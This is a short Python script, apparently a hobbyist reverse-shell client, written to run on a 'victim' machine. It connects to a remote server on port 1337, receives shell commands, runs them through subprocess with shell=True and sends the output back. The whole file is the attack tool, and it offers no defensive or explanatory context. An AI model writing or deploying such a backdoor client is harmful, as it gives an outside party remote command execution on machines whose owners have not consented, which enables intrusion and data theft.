import socket
import subprocess
import time
#Connect to the server when the code is run
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Replace with server IP
sock.connect(("", 1337))
#Has everything we need to send been sent?
sent = False

while True:
    #Identifier message that gets sent when we connect(Yes I copied this from the Client file)
    message = "Connected from Victim's System"
    #Send the connected message
    sock.send(str.encode(message))
    #Get the number of command that will be sent to us
    received_num = sock.recv(1024).decode("utf-8")
    #In case the server wants to break we swiftly disconnect
    if received_num == "":
        break
    #Convert it to an int after we have verified that it is not blank
    received_num = int(received_num)
    #If we have already sent crap to the server then disconnect ungracefully
    if(sent):
        break
    #Loop through the recieved commands
    for i in range(received_num):
        #Get the next command to run
        received = sock.recv(1024) 
        #Get the output of the command
        result = subprocess.check_output(received, shell=True, text=True)
        #Format it so that the Client can see what command was run
        ee = "Output of " + received.decode("utf-8") + ": \n" + result
        #Actually send the output of the command to the server
        sock.send(str.encode(ee))
        #Delay next message
        time.sleep(0.1)
    sent = True